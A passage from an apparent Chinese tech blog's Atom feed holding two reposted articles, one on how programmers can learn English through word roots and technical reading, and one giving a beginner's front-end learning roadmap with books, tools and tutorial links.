      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="VUE" scheme="http://qrframe.com/tags/VUE/"/>
    
      <category term="ElementUI" scheme="http://qrframe.com/tags/ElementUI/"/>
    
  </entry>
  
  <entry>
    <title>【转】浅谈程序员的英语学习</title>
    <link href="http://qrframe.com/2016/07/21/%E3%80%90%E8%BD%AC%E3%80%91%E6%B5%85%E8%B0%88%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/"/>
    <id>http://qrframe.com/2016/07/21/【转】浅谈程序员的英语学习/</id>
    <published>2016-07-21T01:07:55.000Z</published>
    <updated>2016-07-21T01:09:10.429Z</updated>
    
    <content type="html">&lt;pre&gt;&lt;code&gt;读完该文后，对作者在“词根词缀法”这一段的说法感触甚深，所以转载了这篇文章的部分内容，以作记录！文章末尾有原文链接。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作为在中国工作的程序员，不懂得英语似乎也不妨碍找到好工作，升职加薪。但程序员这个工种则稍有不同，因为程序，尤其是高级语言，基本上都是由英语和数字表达式构成的。英语对于程序员十分重要。我的大学本科全部采用英文教学，工作时也经常会遇到外国人，和他们谈笑风生，自认为自己的英语水平比园子的平均水平高一点。下面我就根据自己的经验来说说英语的学习方法。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;为什么要学习英语&quot;&gt;&lt;a href=&quot;#为什么要学习英语&quot; class=&quot;headerlink&quot; title=&quot;为什么要学习英语&quot;&gt;&lt;/a&gt;为什么要学习英语&lt;/h2&gt;&lt;p&gt;学好英语你可以直接阅读各种经典书籍的原文版。程序员这个行业之所以特殊，就是因为它所有的技术全部来自欧美，所以最主流，最新鲜，最正确的技术文章都是英文，大部分还没有译本，有些译文还比较差。与其等待别人的翻译，不如直接阅读原文。&lt;/p&gt;
&lt;p&gt;学好英语你可以直接观看来自世界最著名学校的网上课程或编程高手的教学视频。较之汉语教学视频，不知道高到哪里去了，而这些视频通常都没有任何翻译可寻。&lt;/p&gt;
&lt;p&gt;学好英语你可以和世界各地的程序员在Stack overflow，Reddit和Github进行交流，以码会友。如果你不小心搭上了几个哥们，你可能就误打误撞被他们推荐出国工作了。作为工作多年的老鸟，大家自然知道内推的好使程度，要是拿到了公司的录取，那么什么签证都是浮云。&lt;/p&gt;
&lt;p&gt;学好英语，你的代码中变量的命名不会太差，让人摸不着头脑（甚至有人变量使用汉语拼音进行命名）。假设别人写一个方法演示反射的使用，你看到那方法名不是ReflectionDemo，甚至不是ShowReflection，而是FanSheYanShi时，你什么心情？&lt;/p&gt;
&lt;p&gt;学好英语也可以为你的前途打开一扇门，你可以考虑到大陆以外工作生活，领略不同于神州大地的风土人情，感受西方文化，甚至中西合璧，建立一个与众不同的家庭。即使你留在大陆，英语好至少也会让你胜任一些外事工作，能人所不能，这对外企员工来说十分重要，你的上级会高看你一眼，你谈工资时筹码比别人多。&lt;/p&gt;
&lt;h2 id=&quot;什么水平算是英语比较好了，可以不用刻意继续学了&quot;&gt;&lt;a href=&quot;#什么水平算是英语比较好了，可以不用刻意继续学了&quot; class=&quot;headerlink&quot; title=&quot;什么水平算是英语比较好了，可以不用刻意继续学了&quot;&gt;&lt;/a&gt;什么水平算是英语比较好了，可以不用刻意继续学了&lt;/h2&gt;&lt;p&gt;如果你觉得你满足以下这些条件，那我觉得你在英语为母语的国家也可以活得挺滋润的，找到一个码农的工作应该是没什么问题。当然，你可能会栽在医院，街头篮球场，酒吧这种需要高难度英语对话的地方。不过如果仅仅应付工作，你不需要刻意的提高自己的英语水平了，只需要保持即可。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;裸考（故意不准备）托福100+，雅思7+，口语的成绩不是其中最低的&lt;/li&gt;
&lt;li&gt;词汇量达到8000以上&lt;/li&gt;
&lt;li&gt;能够应付30分钟左右的全英文面试，且你在面试过程中说话的比例占至少三分之一，而不是人家说20句你说一句&lt;/li&gt;
&lt;li&gt;阅读一般的技术文章（例如MSDN文档）和技术书籍没有太大障碍，具体来说，生词频率在1/100之下（即任选文章中的100个连续单词，平均只有一个不认识）&lt;/li&gt;
&lt;li&gt;可以使用英文email和公司的外国人交流&lt;/li&gt;
&lt;li&gt;可以和老外聊些简单家常或你比较熟悉的话题，支撑至少15分钟&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;关于单词与阅读&quot;&gt;&lt;a href=&quot;#关于单词与阅读&quot; class=&quot;headerlink&quot; title=&quot;关于单词与阅读&quot;&gt;&lt;/a&gt;关于单词与阅读&lt;/h2&gt;&lt;p&gt;学英语不背单词是不行的，背单词是第一步，只有认识了单词，你才能看懂它，听懂它，最后在口语中运用。如果仅仅为了应付工作，则很多词并不需要背，例如，下面这个图中的所有单词你都不需要知道（可能第１５个需要吧，但你多半应该认识），这丝毫不会影响你阅读技术书籍的速度。基本来说，你只需要知道ＭＳＤＮ，牛人博客里面出现的比较高频的单词，以及你工作中需要用到的概念对应的英文翻译。&lt;/p&gt;
&lt;p&gt;对于初学者而言，不需要阅读其他乱七八糟的小说散文，也不用把新概念看一遍，最重要的就是把你的主力语言中各种术语的维基百科都看一遍，新概念不会告诉你控制反转的英文是ＩＯＣ，pumas are large cat-like animals which are found in America（新概念第三册的第一句话）只能让老美觉得你脑子有问题。（这课是讲从句的，所以几乎所有的句子都是从句）背新概念还不如背技术文档，对于C#，直接看MSDN就行了，例如委托的：&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/ms173171.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/en-us/library/ms173171.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这网页中的单词大抵都是技术上最常用的词了，例如type，method，event，instance（实例）等等。如果你有任意一个单词不认识，说明你的词汇量不过关。不过，各种MSDN文档中的单词重复频率很高，读多了就会越读越快的。你可以把不会的单词记在本子上，而不是买本托福词汇开始背。过了不久你就会发现，技术文档里面转来转去就那几百个词，可能都没有2000个，而一本托福词汇背完了，你还是不知道进程和线程怎么说。如果你对MSDN文档已经可以做到基本不查字典，你可以尝试改用谷歌搜索了。例如，如果你拿不准链表应该在什么时候使用，性能如何，你可以搜索stackoverflow linked list performance / linked list performance comparison，然后点开结果链接 - 这样你的工作中的中文出现频率就大大减少了。如果你已经大规模的使用谷歌，stack overflow，并且对搜出来的链接都读得十分顺畅的话，你不需要再背单词了。&lt;/p&gt;
&lt;h2 id=&quot;词根词缀法&quot;&gt;&lt;a href=&quot;#词根词缀法&quot; class=&quot;headerlink&quot; title=&quot;词根词缀法&quot;&gt;&lt;/a&gt;词根词缀法&lt;/h2&gt;&lt;p&gt;很多技术单词有个特点，就是他们都是造出来的词。我们知道100年前，世界上根本没有计算机语言，所以很多概念不存在，后来，技术发展到今天，出现了很多以前无法想象的概念，例如异步，多线程这种100年前毫无意义的单词。它们都是生造出来的，以前的英语不包括这些单词。而英语造词法通常有两种：一种是追本溯源，例如算法的英文algorithm来自1000年前的某本阿拉伯数学书籍，另一种就是叠加，比如多线程的英文multithreading就是多（multi）和线程（thread）两个字加起来的。异步这个词解释起来稍微复杂些，首先我们要理解同步这个词synchronous：它是由syn （同时） + chron （时间） + ous （形容词后缀）合成的，同时的时间，即为同步。而异步就是不同步的意思，故在同步的英文之前加上一个前缀a-，其代表否定，就得到了异步的英文单词：asynchronous。&lt;/p&gt;
&lt;p&gt;词根是快速扩展英语单词的利器，例如刚才我们看到的几个词根，都是比较常见的，我再举几个例子，这次不再限于技术单词。Chron（时间）演化出来的词还有: chronicle（编年史），chronosphere （时间结界，这个词是dota中虚空假面大招的英文，应该是icefrog在dota中造出来的词。Sphere代表一个半球，和时间拼起来，就是时空半球。我们可以直观的想象出一个半球罩住一片地方，里面的时间停止了）。&lt;/p&gt;
&lt;p&gt;Covariance和countervariance这两个货，很多人一看单词很长就产生惧怕感，但实际上，越长的单词，造出来的可能性就越大。先告诉你vari是变的意思，你肯定知道一个它的衍生词variable，变量（能够变的东西，瞧，你顺便又学会了一个后缀 –able，能够的意思），variance可以看成是其名词的形式，在数学上，我们用这个词表示方差。那么如果你知道co是协同（和con一样），counter是反着的，那么covariance和countervariance这两个词的意思你大概也就猜出来了：协变和逆变。另外说一句，counter加上单词strike（打击）就成了很多人都很熟悉的一个单词，缩写为CS（反恐精英）。当然counterstrike这个单词本身只是反击的意思，和恐怖分子，精英都没有半点关系，不过反恐精英这个翻译确实不错。&lt;/p&gt;
&lt;p&gt;Interoperablity，别看它很长，你应该也能猜出来，如果你认识operate的话，你就可以看出来它是怎么来的了吧。它的意思是“互操作性”，我们知道Ｃ＃有一些库例如Microsoft.Office.Interop.Word，Microsoft.Office.Interop.Excel，Interop就是Interoperablity的简单说法，这些库也是专门用来和COM打交道的，可谓名如其库。inter代表相互的，交互的，很自然的我们都知道它的两个派生词：internet，交互的网，即互联网（相对的，intranet就是内联网），interview，互相看，即面试（&lt;strong&gt;所以面试不仅仅是公司挑你，你也在挑公司&lt;/strong&gt;）），还有intersteller，如果我告诉你stell是星辰的意思，你猜猜这个词（交互的星辰的人）啥意思 – 中文翻译 – 星际迷航。那么好了，你知道stell是星辰了，又知道con是一堆的意思，那么constellation是啥？一堆星星 – 星座！&lt;/p&gt;
&lt;p&gt;一些其他的例子：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Re-factor: 重构&lt;/li&gt;
&lt;li&gt;Trans-action: 事务&lt;/li&gt;
&lt;li&gt;Pre-process-or: 在前面+处理+的人 –〉预处理器&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于有一定英语基础，比如考过四级的人来说，词根词缀可以迅速扩大词汇量，通常可以扩大一倍。掌握了一些基本词根词缀之后，你会发现，很多词你根本没见过，但你就是能猜出它的意思。你的词汇量远远多于你意识中自己的词汇量个数。词根词缀为什么如此强大？有时候，我会把词根词缀造词法类别汉字中的偏旁部首。我们的汉字有很多字的偏旁都相同，而有些偏旁自己是有意义的，例如雨字头本身代表下雨，属于雨字头的很多字和天气也有关，例如霏，霁等。英语本身来自于拉丁文，很多词根自己就是拉丁文单词，例如aqua，在拉丁文中代表水，它作部首的单词aquarium（水族馆），aquamarine（水蓝色）就可以类比为三点水旁的汉字。关于词根词缀记忆法，如果有兴趣，可以参照&lt;a href=&quot;http://www.360doc.com/content/11/1117/15/1930525_165197518.shtml。不过，不要钻牛角尖，也不用把所有的词根词缀都背下来，那样你的词汇量太大了，保守估计也有2万，你不需要那么多单词，你也没那么多时间。你只需要对技术文章中出现过的单词的词根词缀研究一番就行了，碰上一个词研究一个，没碰上过的（比如你是不怎么可能会在技术文章中遇到aqua这个词根的）就不用管它。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.360doc.com/content/11/1117/15/1930525_165197518.shtml。不过，不要钻牛角尖，也不用把所有的词根词缀都背下来，那样你的词汇量太大了，保守估计也有2万，你不需要那么多单词，你也没那么多时间。你只需要对技术文章中出现过的单词的词根词缀研究一番就行了，碰上一个词研究一个，没碰上过的（比如你是不怎么可能会在技术文章中遇到aqua这个词根的）就不用管它。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当然，不是所有英文单词都是这么造出来的，比如最简单的get，set，have之类的动词。在几百年前，英语的单词数量远远小于现在，那时候就没什么单词是用词根词缀造出来的。根据词根词缀猜出来的单词意思也不见得都对（就如同秀才识字读半边，不一定全对一样），不过，一般来说猜出来的意思都八九不离十，而且很多技术单词是造出来的，这使得我们看技术文章时，可以少背点单词，多猜测下它是怎么来的。&lt;/p&gt;
&lt;p&gt;掌握一个单词不仅仅要做到看到单词知道意思，还要将其读准，否则，老外依然不知道你在说什么。你可以使用谷歌查找单词，获得单词的音标，通常后面都有播放键。如果你是走美音路线的，要做到一些卷舌。要知道长单词中重音的位置（有些在前面，有些在中间），尽量减低中文发音的痕迹（有些速成书中把英文音译成中文以达到速成效果，例如how are you发音好啊油，一定要杜绝这种方式，离这种书越远越好）。你也可以在视频中捉到一些你读的不准确的单词，听听人家怎么读的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;转载自：&lt;a href=&quot;http://www.cnblogs.com/haoyifei/p/5687235.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Chobits的文集&lt;/a&gt;&lt;br&gt;你不能把这个世界，让给你所鄙视的人。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;读完该文后，对作者在“词根词缀法”这一段的说法感触甚深，所以转载了这篇文章的部分内容，以作记录！文章末尾有原文链接。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作为在中国工作的程序员，不懂得英语似乎也不妨碍找到好工作，升职加薪。但程序员这个工种则稍有不同，因为程序，尤其是高级语言，基本上都是由英语和数字表达式构成的。英语对于程序员十分重要。我的大学本科全部采用英文教学，工作时也经常会遇到外国人，和他们谈笑风生，自认为自己的英语水平比园子的平均水平高一点。下面我就根据自己的经验来说说英语的学习方法。&lt;br&gt;
    
    </summary>
    
    
      <category term="英语学习" scheme="http://qrframe.com/tags/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>【转】前端入门方法</title>
    <link href="http://qrframe.com/2016/07/14/%E3%80%90%E8%BD%AC%E3%80%91%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://qrframe.com/2016/07/14/【转】前端入门方法/</id>
    <published>2016-07-14T03:47:48.000Z</published>
    <updated>2016-07-14T03:55:04.014Z</updated>
    
    <content type="html">&lt;p&gt;转载请注明出处: &lt;a href=&quot;https://github.com/qiu-deqing/FE-learning&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/qiu-deqing/FE-learning&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;FE-learning&quot;&gt;&lt;a href=&quot;#FE-learning&quot; class=&quot;headerlink&quot; title=&quot;FE-learning&quot;&gt;&lt;/a&gt;FE-learning&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/qiu-deqing/FE-learning/master/img/FE.jpg&quot; alt=&quot;FE&quot;&gt;&lt;/p&gt;
&lt;p&gt;结合个人经历总结的前端入门方法，总结从零基础到具备前端基本技能的道路、学习方法、资料。由于能力有限，不能保证面面俱到，只是作为入门参考，面向初学者，让初学者少走弯路。&lt;/p&gt;
&lt;p&gt;互联网的快速发展和激烈竞争，用户体验成为一个重要的关注点，导致专业前端工程师成为热门职业，各大公司对前端工程师的需求量都很大，要求也越来越高，优秀的前端工程师更是稀缺。个人感觉前端入门相对容易，但是也需要系统地认真学习，在打好基础后坚持学习，成为优秀前端工程师也只是时间问题。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;学习任何知识最重要的都是&lt;strong&gt;兴趣&lt;/strong&gt;，如果经过一段时间的学习感觉不喜欢，那可能强迫自己学习是很痛苦的，效果也不会好，毕竟这很可能就是以后很多年生存的技能。不过随着互联网行业的发展，前端必然是Web开发人员需要学习的知识，有时候是没有专业前端工程师一起合作的，所以即使不做专门的前端工程师，掌握基本的前端技能为工作带来方便。&lt;/p&gt;
&lt;p&gt;后期邀请了一些同学分享学习经历。如果有同学愿意分享,欢迎push&lt;/p&gt;
&lt;h2 id=&quot;必备基础技能&quot;&gt;&lt;a href=&quot;#必备基础技能&quot; class=&quot;headerlink&quot; title=&quot;必备基础技能&quot;&gt;&lt;/a&gt;必备基础技能&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/JacksonTian/fks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端技能汇总&lt;/a&gt;这个项目详细记录&lt;br&gt;了前端工程师牵涉到的各方面知识。在具备基本技能之后可以在里面找到学习&lt;br&gt;的方向，完善技能和知识面。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/dypsilon/frontend-dev-bookmarks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;frontend-dev-bookmarks&lt;/a&gt;是老外总结的前端开发资源。覆盖面非常广。包括各种知识点、工具、技术，非常全面。&lt;/p&gt;
&lt;p&gt;以下是个人觉得入门阶段应该熟练掌握的基础技能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/html401/cover.html#minitoc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTML4&lt;/a&gt;，&lt;a href=&quot;http://www.w3.org/TR/html5/#contents&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTML5&lt;/a&gt;语法、标签、语义&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/CSS2/#minitoc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS2.1&lt;/a&gt;，&lt;a href=&quot;http://www.w3.org/TR/2001/WD-css3-roadmap-20010523/#table&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS3&lt;/a&gt;规范，与HTML结合实现各种布局、效果&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ecma-262&lt;/a&gt;定义的javascript的语言核心，原生&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;客户端javascript&lt;/a&gt;，&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DOM操作&lt;/a&gt;，&lt;a href=&quot;https://developer.mozilla.org/en/docs/web/Guide/HTML/HTML5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTML5新增功能&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一个成熟的客户端javascript库，推荐&lt;a href=&quot;http://jquery.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;jquery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一门服务器端语言：如果有服务器端开发经验，使用已经会的语言即可，如果没有服务器端开发经验，熟悉Java可以选择Servlet，不熟悉的可以选PHP，能实现简单登陆注册功能就足够支持前端开发了，后续可能需要继续学习，最基本要求是实现简单的功能模拟，&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTTP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在掌握以上基础技能之后，工作中遇到需要的技术也能快速学习。&lt;/p&gt;
&lt;h2 id=&quot;基本开发工具&quot;&gt;&lt;a href=&quot;#基本开发工具&quot; class=&quot;headerlink&quot; title=&quot;基本开发工具&quot;&gt;&lt;/a&gt;基本开发工具&lt;/h2&gt;&lt;p&gt;恰当的工具能有效提高学习效率，将重点放在知识本身，在出现问题时能快速定位并&lt;br&gt;解决问题，以下是个人觉得必备的前端开发工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;文本编辑器&lt;/strong&gt;：推荐&lt;a href=&quot;http://www.sublimetext.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sublime Text&lt;/a&gt;，支持各种插件、主题、设置，使用方便&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;浏览器&lt;/strong&gt;：推荐&lt;a href=&quot;http://www.google.cn/chrome/?hl=zh-CN&amp;amp;standalone=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Google Chrome&lt;/a&gt;，更新快，对前端各种标准提供了非常好的支持&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调试工具&lt;/strong&gt;：推荐Chrome自带的&lt;a href=&quot;https://developer.chrome.com/devtools&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Chrome develop tools&lt;/a&gt;，可以轻松查看DOM结构、样式，通过控制台输出调试信息，调试javascript，查看网络等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;辅助工具&lt;/strong&gt;：PhotoShop编辑图片、取色，fireworks量尺寸，AlloyDesigner对比尺寸，以及前面的到的Chrome develop tools，&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;翻墙工具&lt;/strong&gt;：lantern, 壁虎漫步&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;学习方法和学习目标&quot;&gt;&lt;a href=&quot;#学习方法和学习目标&quot; class=&quot;headerlink&quot; title=&quot;学习方法和学习目标&quot;&gt;&lt;/a&gt;学习方法和学习目标&lt;/h2&gt;&lt;p&gt;方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;入门阶段反复阅读&lt;strong&gt;经典书籍的中文版&lt;/strong&gt;，书籍中的每一个例子都动手实现并在浏览器中查看效果&lt;/li&gt;
&lt;li&gt;在具备一定基础之后可以上网搜各种教程、demo，了解各种功能的实际用法和常见功能的实现方法&lt;/li&gt;
&lt;li&gt;阅读HTML，CSS，Javascript标准全面完善知识点&lt;/li&gt;
&lt;li&gt;阅读前端牛人的博客、文章提升对知识的理解&lt;/li&gt;
&lt;li&gt;善用搜索引擎&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;目标：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;熟记前面知识点部分的重要概念，结合学习经历得到自己的理解&lt;/li&gt;
&lt;li&gt;熟悉常见功能的实现方法，如常见CSS布局，Tab控件等。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;入门之路&quot;&gt;&lt;a href=&quot;#入门之路&quot; class=&quot;headerlink&quot; title=&quot;入门之路&quot;&gt;&lt;/a&gt;入门之路&lt;/h2&gt;&lt;p&gt;以下是入门阶段不错的书籍和资料&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTML先看&lt;a href=&quot;http://www.amazon.cn/gp/product/B00BMK4GKW/ref=s9_simh_gw_p14_d0_i2?pf_rd_m=A1AJ19PSB66TGU&amp;amp;pf_rd_s=center-2&amp;amp;pf_rd_r=1AH2NF64STS19GY8GR54&amp;amp;pf_rd_t=101&amp;amp;pf_rd_p=108773272&amp;amp;pf_rd_i=899254051&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《HTML &amp;amp; CSS: Design and Build Websites》&lt;/a&gt;1-9章，然后&lt;a href=&quot;http://www.amazon.cn/HTML5%E7%A7%98%E7%B1%8D-Matthew-MacDonald/dp/B009DFCZAQ/ref=sr_1_1?ie=UTF8&amp;amp;qid=1414740812&amp;amp;sr=8-1&amp;amp;keywords=html5+the+missing+manual&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《HTML5: The Missing Manual》&lt;/a&gt;1-4章。&lt;/li&gt;
&lt;li&gt;CSS先看&lt;a href=&quot;http://www.amazon.cn/CSS-The-Missing-Manual-Mcfarland-David-Sawyer/dp/0596802447/ref=sr_1_1?ie=UTF8&amp;amp;qid=1414742710&amp;amp;sr=8-1&amp;amp;keywords=css+the+missing+manual+2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《CSS: The Missing Manual》&lt;/a&gt;，然后&lt;a href=&quot;http://www.amazon.cn/CSS%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E8%BF%88%E8%80%B6/dp/B0011F5SIC/ref=sr_1_1?ie=UTF8&amp;amp;qid=1414744248&amp;amp;sr=8-1&amp;amp;keywords=css+%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《CSS权威指南》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;javascript先看&lt;a href=&quot;http://www.amazon.cn/JavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E6%B3%BD%E5%8D%A1%E6%96%AF/dp/B007OQQVMY/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1414744358&amp;amp;sr=1-1&amp;amp;keywords=javascript+%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《javascript高级程序设计》&lt;/a&gt;，然后&lt;a href=&quot;http://www.amazon.cn/O-Reilly%E7%B2%BE%E5%93%81%E5%9B%BE%E4%B9%A6%E7%B3%BB%E5%88%97-JavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%BC%97%E5%85%B0%E7%BA%B3%E6%A0%B9/dp/B007VISQ1Y/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1414744401&amp;amp;sr=1-1&amp;amp;keywords=javascript+%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《javascript权威指南》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;HTTP看&lt;a href=&quot;http://www.amazon.cn/HTTP%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%90%89%E5%B0%94%E5%88%A9/dp/B008XFDQ14/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1414744440&amp;amp;sr=1-1&amp;amp;keywords=HTTP+%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTTP权威指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;在整个学习过程中HTML CSS JavaScript会有很多地方需要互相结合，实际工作中也是这样，一个简单的功能模块都需要三者结合才能实现。&lt;/li&gt;
&lt;li&gt;动手是学习的重要组成部分，书籍重点讲解知识点，例子可能不是很充足，这就需要利用搜索引擎寻找一些简单教程，照着教程实现功能。以下是一些比较好的教程网址&lt;ul&gt;
&lt;li&gt;可以搜索各大公司前端校招笔试面试题作为练习题或者他人总结的&lt;a href=&quot;https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Translations/Chinese&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端面试题&lt;/a&gt;还有&lt;a href=&quot;https://github.com/qiu-deqing/FE-interview&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;个人总结的面试题&lt;/a&gt;（带参考答案）&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://code.tutsplus.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://code.tutsplus.com&lt;/a&gt;有各种各样的教程&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MDN&lt;/a&gt;也有很多教程，更重要的是里面有详细的文档，需要查找某个功能时在Google搜索：&lt;code&gt;xxx site:https://developer.mozilla.org&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/zh/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.html5rocks.com/zh/&lt;/a&gt;也有很多优质教程&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.sitepoint.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://alistapart.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://alistapart.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原生javascript是需要重点掌握的技能，在掌握原生javascript的基础上推荐熟练掌握jQuery，在实际工作中用处很大，这方面的书籍有&lt;a href=&quot;http://www.amazon.com/Learning-jQuery-Fourth-Jonathan-Chaffer/dp/178216314X/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1410099243&amp;amp;sr=1-1&amp;amp;keywords=learning+jquery&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Learning jQuery》&lt;/a&gt;或者去&lt;a href=&quot;http://learn.jquery.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;jQuery官网&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;建一个&lt;a href=&quot;https://github.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/&lt;/a&gt;账号，保存平时学习中的各种代码和项目。&lt;/li&gt;
&lt;li&gt;有了一定基础之后可以搭建一个个人博客，记录学习过程中遇到的问题和解决方法，方便自己查阅也为其他人提供了帮助。也可以去&lt;a href=&quot;http://www.cnblogs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/&lt;/a&gt;或者&lt;a href=&quot;http://www.csdn.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.csdn.net/&lt;/a&gt;这样的网站注册账号，方便实用&lt;/li&gt;
&lt;li&gt;经常实用Google搜索英文资料应该经常找到来自&lt;a href=&quot;http://stackoverflow.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://stackoverflow.com/&lt;/a&gt;的高质量答案，与到问题可以直接在这里搜索，如果有精力，注册一个账号为别人解答问题也能极大提高个人能力。&lt;/li&gt;
&lt;li&gt;经典书籍熟读之后，可以打开前面必备基础技能部分的链接。认真读对应标准，全面掌握知识&lt;/li&gt;
&lt;/ol&gt;
